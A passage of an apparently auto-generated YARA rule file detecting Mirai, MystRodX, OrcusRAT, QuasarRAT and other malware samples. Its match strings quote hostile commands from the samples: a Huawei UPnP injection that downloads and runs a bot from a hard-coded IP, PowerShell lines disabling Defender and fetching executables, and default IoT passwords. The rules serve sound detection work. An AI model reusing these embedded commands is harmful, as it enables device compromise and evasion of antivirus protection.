      $s2 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" fullword ascii /* score: '22.00'*/
      $s4 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s5 = "hexdump" fullword ascii /* score: '18.00'*/
      $s6 = "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" fullword ascii /* score: '17.00'*/
      $s7 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 11; Mi 10T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s14 = "syslogd" fullword ascii /* score: '13.00'*/
      $s15 = "rsyslog" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule Mirai_signature__e06ada70 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e06ada70.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e06ada701a704de541fdc0c2732eb3182f58bb716270ae69ad804fbb8e7887ef"
   strings:
      $x1 = ",N^Nu<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas." ascii /* score: '40.00'*/
      $s2 = " wget -g 193.111.248.188 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDo" ascii /* score: '28.00'*/
      $s3 = "ap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busy" ascii /* score: '13.00'*/
      $s4 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = ",N^Nu<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas." ascii /* score: '10.00'*/
      $s6 = "kworker" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__e7aee513 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e7aee513.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e7aee5138ba88c92846e7c80b450e5ef51f2d0deaa70d96636dff7581ad96615"
   strings:
      $s1 = "Failed to create symlink in %s: %s" fullword ascii /* score: '12.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f2a8c4ab {
   meta:
      description = "_subset_batch - file Mirai(signature)_f2a8c4ab.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f2a8c4ab32e847e4a18f1437b6982ea2e9c0574184dd77bb92ea86a45a058751"
   strings:
      $s1 = "zl}Jffb`l!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__f7413e7b {
   meta:
      description = "_subset_batch - file Mirai(signature)_f7413e7b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f7413e7bdee70ef3205d6c8a633ff7f4d6db64d691a66fdff907a88c252610b5"
   strings:
      $s1 = "attack_tcp_bypass" fullword ascii /* score: '15.00'*/
      $s2 = "attack_tcp_rbypass" fullword ascii /* score: '15.00'*/
      $s3 = "attack_udp_bypass" fullword ascii /* score: '15.00'*/
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s5 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s6 = "exec_unnamed" fullword ascii /* score: '12.00'*/
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s8 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s9 = "attack_get_opt_ip" fullword ascii /* score: '9.00'*/
      $s10 = "attack_get_opt_int" fullword ascii /* score: '9.00'*/
      $s11 = "udp_discord_flood" fullword ascii /* score: '9.00'*/
      $s12 = "util_fdgets" fullword ascii /* score: '9.00'*/
      $s13 = "selfrealpath" fullword ascii /* score: '8.00'*/
      $s14 = "halphaset" fullword ascii /* score: '8.00'*/
      $s15 = "balphaset" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Mirai_signature__f863baaa {
   meta:
      description = "_subset_batch - file Mirai(signature)_f863baaa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f863baaa35bf5e411e5e0a522a8b9d0ac6cdd07f7a5e89c95485431cd6abff22"
   strings:
      $s1 = "attack_tcp_bypass" fullword ascii /* score: '15.00'*/
      $s2 = "attack_tcp_rbypass" fullword ascii /* score: '15.00'*/
      $s3 = "attack_udp_bypass" fullword ascii /* score: '15.00'*/
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s5 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s6 = "exec_unnamed" fullword ascii /* score: '12.00'*/
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s8 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s9 = "attack_get_opt_ip" fullword ascii /* score: '9.00'*/
      $s10 = "attack_get_opt_int" fullword ascii /* score: '9.00'*/
      $s11 = "udp_discord_flood" fullword ascii /* score: '9.00'*/
      $s12 = "util_fdgets" fullword ascii /* score: '9.00'*/
      $s13 = "selfrealpath" fullword ascii /* score: '8.00'*/
      $s14 = "halphaset" fullword ascii /* score: '8.00'*/
      $s15 = "balphaset" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Mirai_signature__e28f3c78 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e28f3c78.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e28f3c7821bc62db7b34af016ed43fd7573657e4f83c626995519124771e0c90"
   strings:
      $s1 = "./doc/page/login.asp?_" fullword ascii /* score: '18.00'*/
      $s2 = "srcport" fullword ascii /* score: '11.00'*/
      $s3 = "datarand" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      all of them
}

rule Mirai_signature__f3545a30 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f3545a30.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f3545a30cdb11522567d1373965b167feedebfeb1de3e23fd2412b4609190aa6"
   strings:
      $s1 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s2 = "exec_unnamed" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__ff4bbda1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ff4bbda1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ff4bbda148c27c3ef591a5270825c632970360089c8f762d49b9de92ea9b1f7e"
   strings:
      $s1 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s2 = "exec_unnamed" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule MystRodX_signature__e053b559 {
   meta:
      description = "_subset_batch - file MystRodX(signature)_e053b559.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e053b559ebc2c132af42c6f16dde6afb7a411ac7f9f90b5c67bfbe015eca1e8f"
   strings:
      $s1 = "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s2 = "RKEVYNGBU" fullword ascii /* base64 encoded string*/ /* score: '16.50'*/
      $s3 = "rm -f /usr/local/bin/chargen > /dev/null 2>&1" fullword ascii /* score: '14.00'*/
      $s4 = "rm -f /usr/local/bin/daytime > /dev/null 2>&1" fullword ascii /* score: '14.00'*/
      $s5 = "* -#m\\#/'" fullword ascii /* score: '13.00'*/
      $s6 = "* \"Q)7+ -_0" fullword ascii /* score: '13.00'*/
      $s7 = "$+ '6%!.A" fullword ascii /* score: '13.00'*/ /* hex encoded string 'j' */
      $s8 = "* -7pU" fullword ascii /* score: '13.00'*/
      $s9 = "top -b -n 1 | grep -w 'chargen' | grep -v 'grep' | awk '{print $1}' | xargs kill -9 > /dev/null 2>&1" fullword ascii /* score: '12.00'*/
      $s10 = "rm -f /etc/rc.d/init.d/networkd > /dev/null 2>&1" fullword ascii /* score: '12.00'*/
      $s11 = "rm -f /etc/init.d/networkd > /dev/null 2>&1" fullword ascii /* score: '12.00'*/
      $s12 = "top -b -n 1 | grep -w 'daytime' | grep -v 'grep' | awk '{print $1}' | xargs kill -9 > /dev/null 2>&1" fullword ascii /* score: '12.00'*/
      $s13 = "&|||||" fullword ascii /* reversed goodware string '|||||&' */ /* score: '11.00'*/
      $s14 = "////////////," fullword ascii /* reversed goodware string ',////////////' */ /* score: '11.00'*/
      $s15 = "m|||||||" fullword ascii /* reversed goodware string '|||||||m' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 4000KB and
      8 of them
}

rule PureLogsStealer_signature__3596eb1ecbadd312aefd6ba77c31dc59_imphash_ {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_3596eb1ecbadd312aefd6ba77c31dc59(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2ee647ac7852be7cfbf2ab9b2b321292921ef9d0565715818adbcd7c0e9fbbb4"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><d" ascii /* score: '48.00'*/
      $x2 = " unzip 1.01 Copyright 1998-2004 Gilles Vollant - http://www.winimage.com/zLibDll" fullword ascii /* score: '32.00'*/
      $x3 = "[FLog::Macroprofile] Profiler raw dump of last %d frames is dumped to %s, took %.2f ms" fullword ascii /* score: '31.50'*/
      $s4 = "C:\\buildAgent\\work\\ci_deploy_ninja_boot-x86_git\\Client\\WinUtil\\src\\GdipImageLoader.cpp" fullword ascii /* score: '30.00'*/
      $s5 = "C:\\buildAgent\\work\\ci_deploy_ninja_boot-x86_git\\build.ninja\\common\\vs2019\\x86\\release\\Installer\\Windows\\RobloxPlayerI" ascii /* score: '30.00'*/
      $s6 = "[FLog::Macroprofile] Profiler dump of last %d frames is dumped to %s and %s" fullword ascii /* score: '29.00'*/
      $s7 = "[DFLog::HttpTraceLight] Fixed backoff processing: Endpoint: %s,  Retry Time from header: %f, Retry Time set: %f" fullword ascii /* score: '28.50'*/
      $s8 = "[DFLog::SQLite] execSQL [ERROR] {} - {} SQL: {}" fullword ascii /* score: '28.00'*/
      $s9 = "compiler: cl  /Zi /Fdossl_static.pdb /MT /Zl /Gs0 /GF /Gy /W3 /wd4090 /nologo /O2 -Oy- -DL_ENDIAN -DOPENSSL_PIC -D\"OPENSSL_BUIL" ascii /* score: '27.00'*/
      $s10 = "C:\\buildAgent\\work\\ci_deploy_ninja_boot-x86_git\\Client\\Installer\\Windows\\src\\DownloadManager.cpp" fullword ascii /* score: '27.00'*/
      $s11 = "[FLog::Output] Dumped Raw Data %d KB Strings %d KB" fullword ascii /* score: '26.00'*/
      $s12 = "[DFLog::HttpTraceLight] HttpRequest(#%u %p) %s url:\"%s\" postSize:%zu cachePolicy:%d%s external:%d retry:%d%s%s" fullword ascii /* score: '26.00'*/
      $s13 = "[FLog::Macroprofile] Profiler raw dump of last {} frames is dumped to {}, took {:.2f} ms" fullword ascii /* score: '26.00'*/
      $s14 = "ncy><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processor" ascii /* score: '26.00'*/
      $s15 = "C:\\buildAgent\\work\\ci_deploy_ninja_boot-x86_git\\Client\\Installer\\Windows\\src\\Dialog.cpp" fullword ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__f521620f {
   meta:
      description = "_subset_batch - file Mirai(signature)_f521620f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f521620fcedf2d0fbdd84c99a82f9fd92233b152ab5214bf115212177b18a5f1"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for sparc" fullword ascii /* score: '17.50'*/
      $s2 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
      $s3 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s4 = "exec_unnamed" fullword ascii /* score: '12.00'*/
      $s5 = "Can't modify %s's text section. Use GCC option -fPIC for shared objects, please." fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__ff2d4387 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ff2d4387.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ff2d4387cb624cfb0eb01dfe59d09c8acc09eec41873016cc1590b6cffdd10c7"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARM" fullword ascii /* score: '17.50'*/
      $s2 = "R_ARM_PC24: Compile shared libraries with -fPIC!" fullword ascii /* score: '16.00'*/
      $s3 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
      $s4 = "exec_unnamed" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__fd072385 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fd072385.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fd07238570884beaa7f26c644408b18524fd2cc7c3b765ec24a0e9a36069d45a"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for powerpc" fullword ascii /* score: '17.50'*/
      $s2 = "R_PPC_REL24: Compile shared libraries with -fPIC!" fullword ascii /* score: '16.00'*/
      $s3 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
      $s4 = "exec_unnamed" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule MystRodX_signature__961ac694 {
   meta:
      description = "_subset_batch - file MystRodX(signature)_961ac694.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "961ac6942c41c959be471bd7eea6e708f3222a8a607b51d59063d5c58c54a38d"
   strings:
      $s1 = "St11_Mutex_baseILN9__gnu_cxx12_Lock_policyE2EE" fullword ascii /* score: '15.00'*/
      $s2 = "NSt6thread5_ImplISt12_Bind_simpleIFPFvPvEP13cport_fwd_mgrEEEE" fullword ascii /* score: '13.00'*/
      $s3 = "*St23_Sp_counted_ptr_inplaceINSt6thread5_ImplISt12_Bind_simpleIFZN13cport_fwd_mgr11plugin_recvEPciEUlvE_vEEEESaIS8_ELN9__gnu_cxx" ascii /* score: '13.00'*/
      $s4 = "*St23_Sp_counted_ptr_inplaceINSt6thread5_ImplISt12_Bind_simpleIFZN13cport_fwd_mgr11plugin_recvEPciEUlvE_vEEEESaIS8_ELN9__gnu_cxx" ascii /* score: '13.00'*/
      $s5 = "St23_Sp_counted_ptr_inplaceINSt6thread5_ImplISt12_Bind_simpleIFPFvPvEP8csessionEEEESaISA_ELN9__gnu_cxx12_Lock_policyE2EE" fullword ascii /* score: '13.00'*/
      $s6 = "NSt6thread5_ImplISt12_Bind_simpleIFPFvPvEP8csessionEEEE" fullword ascii /* score: '13.00'*/
      $s7 = "St23_Sp_counted_ptr_inplaceINSt6thread5_ImplISt12_Bind_simpleIFPFvPvEP13cport_fwd_mgrEEEESaISA_ELN9__gnu_cxx12_Lock_policyE2EE" fullword ascii /* score: '13.00'*/
      $s8 = "*NSt6thread5_ImplISt12_Bind_simpleIFZN13cport_fwd_mgr11plugin_recvEPciEUlvE_vEEEE" fullword ascii /* score: '13.00'*/
      $s9 = "id-ce-keyUsage" fullword ascii /* score: '12.00'*/
      $s10 = "/proc/sys/kernel/version" fullword ascii /* score: '12.00'*/
      $s11 = "St22_Maybe_get_result_typeILb1ESt7_Mem_fnIM13cport_fwd_mgrFvixPciEEE" fullword ascii /* score: '12.00'*/
      $s12 = "id-at-postalAddress" fullword ascii /* score: '12.00'*/
      $s13 = "id-ce-extKeyUsage" fullword ascii /* score: '12.00'*/
      $s14 = "St22_Maybe_get_result_typeILb1ESt7_Mem_fnIM8csessionFbPciEEE" fullword ascii /* score: '12.00'*/
      $s15 = "NSt6thread5_ImplISt12_Bind_simpleIFPFvPvEP13cmy_socks_mgrEEEE" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule Mirai_signature__ef140e61 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ef140e61.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ef140e617a04f8038e13c2e8944c3f3985dcca25271e94df8df673e514da140d"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s3 = "juantech" fullword ascii /* score: '8.00'*/
      $s4 = "dreambox" fullword ascii /* score: '8.00'*/
      $s5 = "xmhdipc" fullword ascii /* score: '8.00'*/
      $s6 = "avocent" fullword ascii /* score: '8.00'*/
      $s7 = "root126" fullword ascii /* score: '8.00'*/
      $s8 = "realtek" fullword ascii /* score: '8.00'*/
      $s9 = "cxlinux" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f662d746 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f662d746.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f662d7466303ccebaf57df91e89088efb871d772c81047a407948269f5195df4"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "__kernel_clock_gettime" fullword ascii /* score: '14.00'*/
      $s3 = "miraisucks.lol" fullword ascii /* score: '10.00'*/
      $s4 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s5 = "juantech" fullword ascii /* score: '8.00'*/
      $s6 = "dreambox" fullword ascii /* score: '8.00'*/
      $s7 = "xmhdipc" fullword ascii /* score: '8.00'*/
      $s8 = "avocent" fullword ascii /* score: '8.00'*/
      $s9 = "root126" fullword ascii /* score: '8.00'*/
      $s10 = "realtek" fullword ascii /* score: '8.00'*/
      $s11 = "cxlinux" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Mirai_signature__fd3a5237 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fd3a5237.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fd3a52379048d9f929efe9f53fd27ee44c38b446c2f4317994709d97531e4888"
   strings:
      $s1 = "rootpasswd" fullword ascii /* score: '14.00'*/
      $s2 = "__kernel_clock_gettime" fullword ascii /* score: '14.00'*/
      $s3 = "mrrp.ink" fullword ascii /* score: '10.00'*/
      $s4 = "juantech" fullword ascii /* score: '8.00'*/
      $s5 = "dreambox" fullword ascii /* score: '8.00'*/
      $s6 = "xmhdipc" fullword ascii /* score: '8.00'*/
      $s7 = "avocent" fullword ascii /* score: '8.00'*/
      $s8 = "root126" fullword ascii /* score: '8.00'*/
      $s9 = "realtek" fullword ascii /* score: '8.00'*/
      $s10 = "cxlinux" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule OrcusRAT_signature__471485476459c716374c5ae96580f71f_imphash_ {
   meta:
      description = "_subset_batch - file OrcusRAT(signature)_471485476459c716374c5ae96580f71f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "621fd51b78644e9b8dfa8f419502b204a8084b59f45dc800f39df7c3fa75639f"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:v3=\"urn:schemas-microsoft-com:asm.v3\"><asse" ascii /* score: '48.00'*/
      $x2 = "a:=\"bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Prote" ascii /* score: '47.00'*/
      $x3 = "j:=\"powershell.exe -command \"\"Set-MpPreference -DisableScriptScanning $true\"\"`n\"" fullword ascii /* score: '40.00'*/
      $x4 = "Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language" ascii /* score: '39.00'*/
      $x5 = "a:=\"bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Prote" ascii /* score: '39.00'*/
      $x6 = "dd:=\"powershell -inputformat none -outputformat none -NonInteractive -Command \"\"Add-MpPreference -ExclusionPath %appdata%\\Mi" ascii /* score: '36.00'*/
      $x7 = "dd:=\"powershell -inputformat none -outputformat none -NonInteractive -Command \"\"Add-MpPreference -ExclusionPath %appdata%\\Mi" ascii /* score: '36.00'*/
      $x8 = "oo:=\"powershell.exe -command \"\"if (!(Test-Path '$env:APPDATA\\Microsoft\\Speech')) { New-Item -ItemType Directory -Path '$env" ascii /* score: '36.00'*/
      $x9 = "oo:=\"powershell.exe -command \"\"if (!(Test-Path '$env:APPDATA\\Microsoft\\Speech')) { New-Item -ItemType Directory -Path '$env" ascii /* score: '36.00'*/
      $x10 = "ddd:=\"powershell -inputformat none -outputformat none -NonInteractive -Command \"\"Add-MpPreference -ExclusionPath %appdata%\"" ascii /* score: '36.00'*/
      $x11 = "ff:=\"powershell -command start-bitstransfer https://omtoi101.com/resources/ParallelRunner.exe  .\\Audiodriver.exe `n\"" fullword ascii /* score: '35.00'*/
      $x12 = "d:=\"powershell -inputformat none -outputformat none -NonInteractive -Command \"\"Add-MpPreference -ExclusionPath %temp%\"\"`n\"" ascii /* score: '33.00'*/
      $x13 = "run C:\\Windows\\System32\\cmd.exe /C   \"Example.bat\" ,,hide" fullword ascii /* score: '33.00'*/
      $x14 = "i:=\"powershell.exe -command \"\"Set-MpPreference -PUAProtection disable\"\"`n\"" fullword ascii /* score: '32.00'*/
      $x15 = "k:=\"powershell.exe -command \"\"Set-MpPreference -ModerateThreatDefaultAction 6\"\"`n\"" fullword ascii /* score: '32.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      10 of ($x*)
}

rule PurpleFo_signature_ {
   meta:
      description = "_subset_batch - file PurpleFo(signature).msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7a4bd378812093cf8aa2a3add92477ab4a0647b9e7c3d098560c982cfd971564"
   strings:
      $x1 = "AttributesPatchSizeFile_PatchTypeActionConditionSequenceCostFinalizeCostInitializeTableNameInstallFinalizeInstallInitializeInsta" ascii /* score: '56.00'*/
      $x2 = "emsEnabledSelectionDescriptionSelectionSizeSelectionPathSelectionPathOnVisible1.txt14.34.31938.0103310.0.30319.1VCRUNT~1.DLL|vcr" ascii /* score: '45.00'*/
      $x3 = "WriteEnvironmentStringsProgressDlgAdminWelcomeDlgAI_SET_ADMINExecuteActionExitDialogFatalErrorPrepareDlgUserExitaicustact.dlldia" ascii /* score: '41.00'*/
      $x4 = "WriteEnvironmentStringsProgressDlgAdminWelcomeDlgAI_SET_ADMINExecuteActionExitDialogFatalErrorPrepareDlgUserExitaicustact.dlldia" ascii /* score: '37.00'*/
      $x5 = "LAI_MAINTEndDialogAI_MAINT AND InstallMode=\"Remove\"AI_MAINT AND InstallMode=\"Repair\"AI_PATCHAI_RESUME[_BrowseProperty]SpawnD" ascii /* score: '36.00'*/
      $x6 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii /* score: '35.00'*/
      $x7 = "_APPDIR[AppDataFolder][Manufacturer]\\[ProductName]LaunchFile/EnforcedRunAsAdmin /DontWait \"[#mitts.exe]\"LaunchFile_2/Enforced" ascii /* score: '35.00'*/
      $x8 = "%s\\System32\\cmd.exe" fullword wide /* score: '32.00'*/
      $x9 = "[SystemFolder]msiexec.exe" fullword wide /* score: '32.00'*/
      $s10 = "WShell32.dll" fullword wide /* score: '28.00'*/
      $s11 = "vcruntime140.dll" fullword ascii /* score: '26.00'*/
      $s12 = "AsAdmin /DontWait \"[#ChromeSetup.exe]\"SET_SHORTCUTDIRSHORTCUTDIR[ProgramMenuFolder][ProductName]SET_TARGETDIR_TO_APPDIRAI_CORR" ascii /* score: '25.00'*/
      $s13 = "_APPDIR[AppDataFolder][Manufacturer]\\[ProductName]LaunchFile/EnforcedRunAsAdmin /DontWait \"[#mitts.exe]\"LaunchFile_2/Enforced" ascii /* score: '25.00'*/
      $s14 = "t Installed) OR REINSTALLAI_UPGRADE=\"No\" AND (Not Installed)NOT InstalledVersionNTInstallExecuteAI_USE_STD_ODBC_MGRIsolateComp" ascii /* score: '24.00'*/
      $s15 = "log.svgviewer.execmdlinkarrowbanner.scale125.jpgbanner.scale150.jpgbanner.scale200.jpgbanner.svgdialog.scale125.jpgdialog.scale1" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 25000KB and
      1 of ($x*) and all of them
}

rule QuasarRAT_signature__81bd0a759bb35e35112306c97d63e830_imphash_ {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_81bd0a759bb35e35112306c97d63e830(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f3e081a4b2e4302d3b14e5f16aca269ea93aa5cb816bb7ac2a8e4f51a80f0fde"
   strings:
      $x1 = "Failed to open process: explorer.exe" fullword ascii /* score: '33.00'*/
      $x2 = "[-] Failed to get handle to ntdll.dll" fullword ascii /* score: '32.00'*/
      $s3 = "Getting explorer.exe process PID" fullword ascii /* score: '27.00'*/
      $s4 = "Failed to load combase.dll" fullword ascii /* score: '26.00'*/
      $s5 = "Opening chrome.exe process" fullword ascii /* score: '22.00'*/
      $s6 = "[-] Failed to get NtCreateThreadEx address" fullword ascii /* score: '22.00'*/
      $s7 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s8 = "33333333333333335555555555555555" ascii /* score: '19.00'*/ /* hex encoded string '33333333UUUUUUUU' */
      $s9 = "Attempting to make the process persistent..." fullword ascii /* score: '17.00'*/
      $s10 = "GetTempPath2W" fullword ascii /* score: '16.00'*/
      $s11 = "Process name matched." fullword ascii /* score: '15.00'*/
      $s12 = "Could not create process" fullword ascii /* score: '15.00'*/
      $s13 = "Failed to get system information." fullword ascii /* score: '15.00'*/
      $s14 = "QueryInterface call failed for IExecAction" fullword ascii /* score: '15.00'*/
      $s15 = "Comparing process names..." fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__ee518ef6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ee518ef6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ee518ef69c47b1d1733679a8948613a111eab8479ff601732332380e65a58eca"
   strings:
      $s1 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__f9f93bed {
   meta:
      description = "_subset_batch - file Mirai(signature)_f9f93bed.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f9f93bed6018700b5d961c16acd4bff913c697831df29fa1d91dafcdd50686ec"
   strings:
      $s1 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
